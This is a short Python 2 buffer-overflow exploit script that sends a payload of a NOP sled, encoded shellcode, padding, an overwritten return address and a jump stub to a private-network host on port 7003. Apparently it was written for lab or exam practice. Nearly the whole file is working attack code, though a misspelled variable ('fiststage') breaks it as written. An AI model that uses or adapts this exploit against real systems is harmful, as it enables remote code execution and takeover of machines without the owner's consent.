#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  shellcode=("\xda\xde\xbf\x07\x36\xf1\x25\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x7a\x17\x83\xc2\x04\x03\x7d\x25\x13\xd0\x7d\xa1\x51"
"\x1b\x7d\x32\x36\x95\x98\x03\x76\xc1\xe9\x34\x46\x81\xbf\xb8"
"\x2d\xc7\x2b\x4a\x43\xc0\x5c\xfb\xee\x36\x53\xfc\x43\x0a\xf2"
"\x7e\x9e\x5f\xd4\xbf\x51\x92\x15\x87\x8c\x5f\x47\x50\xda\xf2"
"\x77\xd5\x96\xce\xfc\xa5\x37\x57\xe1\x7e\x39\x76\xb4\xf5\x60"
"\x58\x37\xd9\x18\xd1\x2f\x3e\x24\xab\xc4\xf4\xd2\x2a\x0c\xc5"
"\x1b\x80\x71\xe9\xe9\xd8\xb6\xce\x11\xaf\xce\x2c\xaf\xa8\x15"
"\x4e\x6b\x3c\x8d\xe8\xf8\xe6\x69\x08\x2c\x70\xfa\x06\x99\xf6"
"\xa4\x0a\x1c\xda\xdf\x37\x95\xdd\x0f\xbe\xed\xf9\x8b\x9a\xb6"
"\x60\x8a\x46\x18\x9c\xcc\x28\xc5\x38\x87\xc5\x12\x31\xca\x81"
"\xd7\x78\xf4\x51\x70\x0a\x87\x63\xdf\xa0\x0f\xc8\xa8\x6e\xc8"
"\x2f\x83\xd7\x46\xce\x2c\x28\x4f\x15\x78\x78\xe7\xbc\x01\x13"
"\xf7\x41\xd4\xb4\xa7\xed\x87\x74\x17\x4e\x78\x1d\x7d\x41\xa7"
"\x3d\x7e\x8b\xc0\xd4\x85\x5c\x2f\x80\x36\x0e\xc7\xd3\x38\x2e"
"\xa3\x5d\xde\x5a\xc3\x0b\x49\xf3\x7a\x16\x01\x62\x82\x8c\x6c"
"\xa4\x08\x23\x91\x6b\xf9\x4e\x81\x1c\x09\x05\xfb\x8b\x16\xb3"
"\x93\x50\x84\x58\x63\x1e\xb5\xf6\x34\x77\x0b\x0f\xd0\x65\x32"
"\xb9\xc6\x77\xa2\x82\x42\xac\x17\x0c\x4b\x21\x23\x2a\x5b\xff"
"\xac\x76\x0f\xaf\xfa\x20\xf9\x09\x55\x83\x53\xc0\x0a\x4d\x33"
"\x95\x60\x4e\x45\x9a\xac\x38\xa9\x2b\x19\x7d\xd6\x84\xcd\x89"
"\xaf\xf8\x6d\x75\x7a\xb9\x9e\x3c\x26\xe8\x36\x99\xb3\xa8\x5a"
"\x1a\x6e\xee\x62\x99\x9a\x8f\x90\x81\xef\x8a\xdd\x05\x1c\xe7"
"\x4e\xe0\x22\x54\x6e\x21")
  nop_sled="\x90"*10
  eip='\x1e\x11\x80\x14'
  firststage="\xff\xd2"
  buffer = nop_sled+shellcode+"A"*(2080-len(shellcode)-len(nop_sled))+eip+fiststage+"\x90"*10
  #8B0 = 2224
    
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.179.159", 7003))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"

